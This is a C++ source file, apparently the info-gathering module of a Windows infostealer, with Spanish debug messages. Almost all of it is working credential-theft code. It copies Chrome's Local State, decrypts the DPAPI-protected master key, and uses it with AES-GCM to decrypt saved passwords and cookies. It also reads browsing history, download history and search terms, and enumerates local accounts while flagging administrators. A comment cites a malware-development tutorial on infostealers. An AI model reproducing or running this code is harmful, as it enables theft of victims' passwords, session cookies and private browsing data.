#include "mod_info.hpp"
#include "misc.hpp"

void mod_Info::test_Data() {
	std::cout << "CHROME PROFILES DUMP_TEST:\n";
	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
		/////////////////////////////////////////////////////
		//                     PASSWORDS
		/////////////////////////////////////////////////////
		/*for (Chrome_Login_Data data : this->m_ProfilePasswords(profile.strPath)) {
			std::cout << "URL: " << data.strUrl << "\n";
			std::cout << "Action: " << data.strAction << "\n";
			std::cout << "User: " << data.strUser << "\n";
			std::cout << "Pass: " << data.strPassword << "\n";
		}*/
		/////////////////////////////////////////////////////
		/////////////////////////////////////////////////////


		/////////////////////////////////////////////////////
		//                     COOKIES
		/////////////////////////////////////////////////////
		/*std::cout << "COOKIES FOR " << profile.strName << "\n==================================\n";
		for (Cookie nCookie : this->m_ProfileCookies(profile.strPath)) {
			if (nCookie.strValue != "" && nCookie.strValue != "V20 Cookie :v" && nCookie.strValue != "ENCRYPTED_ERR") {
				std::cout << "creation_utc: " << nCookie.strCreationUTC << "\n";
				std::cout << "host_key: " << nCookie.strHostKey << "\n";
				std::cout << "name: " << nCookie.strName << "\n";
				std::cout << "value: " << nCookie.strValue << "\n";
				std::cout << "path: " << nCookie.strPath << "\n";
				std::cout << "expires_utc: " << nCookie.strExpiresUTC << "\n";
				std::cout << "last_access_utc: " << nCookie.strLastAccessUTC << "\n";
				std::cout << "last_updatE_utc: " << nCookie.strLastUpdateUTC << "\n";
			}
		}
		std::cout << "\n==================================\n";*/
		/////////////////////////////////////////////////////
		/////////////////////////////////////////////////////


		/////////////////////////////////////////////////////
		//                     HISTORY
		/////////////////////////////////////////////////////
		/*std::cout << "HISTORY FOR " << profile.strName << "\n==================================\n";
		for (Chrome_History& nHistory : this->m_ProfileBrowsingHistory(profile.strPath)) {
			std::cout << "URL: " << nHistory.strURL << "\n";
			std::cout << "TITLE: " << nHistory.strTitle << "\n";
			std::cout << "VISIT_COUNT: " << nHistory.strVisitCount << "\n";
			std::cout << "LAST_TIME: " << nHistory.strLastVisitTime << "\n";
		}
		std::cout << "\n==================================\n"; */
		/////////////////////////////////////////////////////
		/////////////////////////////////////////////////////


		/////////////////////////////////////////////////////
		//              DOWNLOAD  HISTORY
		/////////////////////////////////////////////////////
		/*std::cout << "DOWNLOAD HISTORY FOR " << profile.strName << "\n==================================\n";
		for (Chrome_Download_History& nDownload : this->m_ProfileDownloadHistory(profile.strPath)) {
			std::cout << "PATH: " << nDownload.strTargetPath << "\n";
			std::cout << "START: " << nDownload.strStartTime << "\n";
			std::cout << "BYTES: " << nDownload.strTotalBytes << "\n";
			std::cout << "URL: " << nDownload.strTabURL << "\n";
			std::cout << "MIME: " << nDownload.strMimeType << "\n";
		}
		std::cout << "\n==================================\n";*/
		/////////////////////////////////////////////////////
		/////////////////////////////////////////////////////



		/*std::cout << "SEARCH TERMS FOR " << profile.strName << "\n==================================\n";
		for (Chrome_Search_Terms& nTerm : this->m_ProfileSearchTerms(profile.strPath)) {
			std::cout << "TERM: " << nTerm.strTerm << "\n";
		}
		std::cout<< "\n==================================\n";*/
		//	std::cout << "\nPATH: " << profile.strPath << "\n";
		//	std::string Login_Path = profile.strPath + "Login Data";
		//	std::cout << "\nNAME: " << profile.strName << "\n";
		//	std::cout << "GAIA_NAME: " << profile.strGaiaName << "\n";
		//	std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
		//	std::cout << "USERNAME: " << profile.strUserName << "\n";
		//	std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
			
	}
}

std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
	std::vector<std::vector<std::string>> vcOut;
	std::string strRandomPath = RandomID(7);
	if (::CopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
		sqlite3* db;

		int iRet = sqlite3_open(strRandomPath.c_str(), &db);

		if (iRet == SQLITE_OK) {
			sqlite3_stmt* pStmt;

			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);

			if (iRet == SQLITE_OK) {
				iRet = sqlite3_step(pStmt);
				while (iRet == SQLITE_ROW) {
					int iColumnCount = sqlite3_column_count(pStmt);
					std::vector<std::string> vcTemp;
					if (iColumnCount > 0) {
						for (int index = 0; index < iColumnCount; index++) {
							vcTemp.push_back(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, index)));
						}
					}
					vcOut.push_back(vcTemp);
					iRet = sqlite3_step(pStmt);
				}
			}
			sqlite3_finalize(pStmt);
		}
	} else {
		_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
	}
	::DeleteFile(strRandomPath.c_str());

	return vcOut;
}

//https://github.com/oomar400/Malware-Development/tree/main/Malware101%3AInfostealers
std::string mod_Info::m_DecryptData(const std::string& strPass) {

	size_t encSize = strPass.size();
	std::string strOut = "ENCRYPTED_ERR";
	
	if (!this->isBcrptOK || encSize < 31) {
		return strOut;
	}else if (strPass.substr(0, 3) == "v20") {
		return "V20 Cookie :v";
	}

	NTSTATUS nStatus = 0;

	ULONG uPlainSize =              0;

	std::vector<BYTE> vc_CipherPass(encSize);
	std::vector<BYTE> vc_Plain;
	std::vector<BYTE> IV(12);

	memcpy(IV.data(), strPass.data() + 3, 12);
	memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);

	size_t tagOffset = encSize - 31;
	if (tagOffset < 0 || tagOffset > vc_CipherPass.size()) {
		__DBG_("Error parseando el offset");
		return strOut;
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
	authInfo.pbNonce = IV.data();
	authInfo.cbNonce = 12;
	authInfo.pbTag = vc_CipherPass.data() + tagOffset;
	authInfo.cbTag = 16;
	authInfo.dwFlags &= ~BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;

	nStatus = BCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		_DBG_("BCryptDecrypt_1 error", GetLastError());
		return strOut;
	}

	vc_Plain.resize(uPlainSize);

	nStatus = BCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		_DBG_("BCryptDecrypt_2", nStatus);
		return strOut;
	}
	
	strOut = std::string(vc_Plain.begin(), vc_Plain.end());

	return strOut;
}

std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
	DATA_BLOB encryptedPass, decryptedPass;
	std::string strOut = "";
	std::string strTmp = strPass;
	strTmp.erase(strTmp.find_last_not_of(" \n\r\t") + 1);

	encryptedPass.cbData = (DWORD)strTmp.size();
	encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);

	memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
	
	if (!::CryptUnprotectData(
		&encryptedPass, // In Data
		NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
		NULL,           // Optional entropy
		NULL,           // Reserved
		NULL,           // Here, the optional
		// prompt structure is not
		// used.
		0,
		&decryptedPass)) {
		__DBG_("Error desencriptando la password");
		__DBG_(GetLastError());
	}else {
		strOut = reinterpret_cast<const char*>(decryptedPass.pbData);
	}
	
	free(encryptedPass.pbData); encryptedPass.pbData = NULL;
	LocalFree(decryptedPass.pbData);
	
	return strOut;
}

std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
	int iBuffSize = 4096;
	std::vector<Chrome_Profile> vcOut;

	LPSTR env_var = (LPSTR)malloc(iBuffSize);
	if (env_var == NULL) {
		__DBG_("No se pudo reservar memoria");
		return vcOut;
	}
	
	if (GetEnvironmentVariable("APPDATA", env_var, iBuffSize) == 0) {
		_DBG_("Error", GetLastError());
		return vcOut;
	}
	
	std::string strPath = env_var;
	
	free(env_var); env_var = NULL;

	std::vector<std::string> vcTemp = strSplit(strPath, '\\', 1024);
	vcTemp.pop_back();
	
	strPath = "";
	for (std::string sub_path : vcTemp) {
		strPath += sub_path + "\\";
	}
	strPath += "Local\\Google\\Chrome\\User Data\\";

	this->strBasePath = strPath;
	
	//Copiar archivo que contiene la llave maestra e informacion de perfiles de chrome
	std::string strFile = strPath + "Local State";
	if (!::CopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
		__DBG_("No se pudo copiar el archivo local state");
		__DBG_(GetLastError());
		return vcOut;
	}

	std::ifstream iFile("saramambichi");
	if (iFile.is_open()) {
		nlohmann::json jeyson = nlohmann::json::parse(iFile);
		if (!jeyson.is_null()) {
			this->vcChromeProfiles.clear();

			//Informacion de perfiles de chrome
			for (auto& itm : jeyson["profile"]["info_cache"].items()) {
				std::string temp_Path = strPath + itm.key() + "\\";
				Chrome_Profile nProfile;
				nProfile.strPath = temp_Path;
				nProfile.strName         = itm.value()["name"         ];
				if (nProfile.strName.size() == 0) { nProfile.strName = "-"; }
				nProfile.strGaiaName     = itm.value()["gaia_name"    ];
				if (nProfile.strGaiaName.size() == 0) { nProfile.strGaiaName = "-"; }
				nProfile.strShortCutName = itm.value()["shortcut_name"];
				if (nProfile.strShortCutName.size() == 0) { nProfile.strShortCutName = "-"; }
				nProfile.strUserName     = itm.value()["user_name"    ];
				if (nProfile.strUserName.size() == 0) { nProfile.strUserName = "-"; }
				nProfile.strHostedDomain = itm.value()["hosted_domain"];
				if (nProfile.strHostedDomain.size() == 0) { nProfile.strHostedDomain = "-"; }
				vcOut.push_back(nProfile);

				this->vcChromeProfiles.push_back(nProfile);
			}

			//##################################################################################
			//                          Desencriptar llave maestra
			//##################################################################################
			std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
			
			//v20 cookies :v
			//std::string strBoundKey = base64_decode(jeyson["os_crypt"]["app_bound_encrypted_key"]);
			
			strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);
			//strBoundKey = strBoundKey.substr(4, strBoundKey.size() - 4);

			strMasterKey = this->m_DecryptMasterKey(strMasterKey);
			//strBoundKey = this->m_DecryptMasterKey(strBoundKey);

			this->vcChromeKey.resize(strMasterKey.size());
			//this->vcBoundKey.resize(strBoundKey.size());

			memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());
			//memcpy(this->vcBoundKey.data(), strBoundKey.data(), strBoundKey.size());

			DATA_BLOB MasterKey;
			MasterKey.cbData = this->vcChromeKey.size();
			MasterKey.pbData = this->vcChromeKey.data();
			NTSTATUS nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
			if (!BCRYPT_SUCCESS(nStatus)) {
				_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
			}else {
				this->isBcrptOK = true;
			}

			/*MasterKey.cbData = this->vcBoundKey.size();
			MasterKey.pbData = this->vcBoundKey.data();

			nStatus = BCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey2, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
			if (!BCRYPT_SUCCESS(nStatus)) {
				_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
				BCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
			}
			else {
				this->isBcrptOK = true;
			}*/
			//##################################################################################
			//##################################################################################
		}
		iFile.close();
	}

	DeleteFile("saramambichi");

	return vcOut;
}

std::vector<Chrome_Login_Data> mod_Info::m_ProfilePasswords(const std::string& strUserPath) {
	std::vector<Chrome_Login_Data> vcOut;
	/*
	TABLE  : logins
	COLUMNS: origin_url, action_url, username_value, password_value
	*/
	std::string strPath = strUserPath + "Login Data";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT origin_url, action_url, username_value, password_value FROM logins;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 4) {
				if (item[0].size() > 0 && item[1].size() > 0 && item[2].size() > 0 && item[3].size() > 0) {
					Chrome_Login_Data nPassword;
					nPassword.strUrl      = item[0];
					nPassword.strAction   = item[1];
					nPassword.strUser     = item[2];
					nPassword.strPassword = this->m_DecryptData(item[3]);
					
					vcOut.push_back(nPassword);
				}
			}
		}
	}
	return vcOut;
}

std::vector<Cookie> mod_Info::m_ProfileCookies(const std::string& strUserPath) {
	std::vector<Cookie> vcOut;
	/*
	TABLE   : cookies
	COLUMNS : creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc
	*/
	std::string strPath = strUserPath + "Network\\Cookies";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT  creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc FROM cookies WHERE encrypted_value != '';", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 8) {
				if (item[3].size() > 0) {
					Cookie nCookie;
					nCookie.strCreationUTC   = item[0];
					nCookie.strHostKey       = item[1];
					nCookie.strName          = item[2];

					//Decrypt value
					nCookie.strValue = this->m_DecryptData(item[3]);

					nCookie.strPath          = item[4];
					nCookie.strExpiresUTC    = item[5];
					nCookie.strLastAccessUTC = item[6];
					nCookie.strLastUpdateUTC = item[7];

					vcOut.push_back(nCookie);
				}
			}
		}
	}

	return vcOut;
}

std::vector<Chrome_Search_Terms> mod_Info::m_ProfileSearchTerms(const std::string& strUserPath) {
	std::vector<Chrome_Search_Terms> vcOut;
	/*
	TABLE    : keyword_search_terms
	COLUMN(s): term
	*/
	std::string strPath = strUserPath + "History";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT term FROM keyword_search_terms;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 1) {
				Chrome_Search_Terms nTerm;
				nTerm.strTerm = item[0];
				vcOut.push_back(nTerm);
			}
		}
	}
	return vcOut;
}

std::vector<Chrome_History> mod_Info::m_ProfileBrowsingHistory(const std::string& strUserPath) {
	std::vector<Chrome_History> vcOut;
	/*
	TABLE   : urls
	COLUMNS : url title visit_count last_visit_time
	COUNT   : 4
	*/
	std::string strPath = strUserPath + "History";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT url, title, visit_count, last_visit_time FROM urls;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 4) {
				Chrome_History nHistory;
				nHistory.strURL           = item[0];
				nHistory.strTitle         = item[1];
				nHistory.strVisitCount    = item[2];
				nHistory.strLastVisitTime = item[3];
				vcOut.push_back(nHistory);
			}
		}
	}
	return vcOut;
}

std::vector<Chrome_Download_History> mod_Info::m_ProfileDownloadHistory(const std::string& strUserPath) {
	std::vector<Chrome_Download_History> vcOut;
	/*
	TABLE   : downloads
	COLUMNS :	target_path	 start_time	 total_bytes tab_url	 mime_type
	COUNT   : 5
	*/
	std::string strPath = strUserPath + "History";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT target_path, start_time, total_bytes, tab_url, mime_type FROM downloads;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 5) {
				Chrome_Download_History nDownload;
				nDownload.strTargetPath = item[0];
				nDownload.strStartTime  = item[1];
				nDownload.strTotalBytes = item[2];
				nDownload.strTabURL     = item[3];
				nDownload.strMimeType   = item[4];
				vcOut.push_back(nDownload);
			}
		}
	}
	return vcOut;
}

std::vector<std::string> mod_Info::m_Usuarios() {
	std::vector<std::string> vcOut;
	LPUSER_INFO_11 lUsers = nullptr;
	LPUSER_INFO_11 lTmpuser = nullptr;
	DWORD dCount = 0, dHints = 0;
	NET_API_STATUS nStatus;
	do {
		nStatus = NetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((lTmpuser = lUsers) != nullptr) {
				for (DWORD i = 0; (i < dCount); i++) {
					if (lUsers == NULL) {
						__DBG_("lUsers = NULL")
						break;
					}
					std::wstring st = lTmpuser->usri11_name;
					std::string strTempUser(st.begin(), st.end());
					if (strTempUser != "") {
						if (lTmpuser->usri11_priv == USER_PRIV_ADMIN) {
							strTempUser += " (ADMIN)";
						}
						vcOut.push_back(strTempUser);
					}
					lTmpuser++;
				}
			}
		}
		if (lUsers != nullptr) {
			NetApiBufferFree(lUsers);
			lUsers = nullptr;
		}
	} while (nStatus == ERROR_MORE_DATA);
	if (lUsers != nullptr) {
		NetApiBufferFree(lUsers);
		lUsers = nullptr;
	}
	return vcOut;
}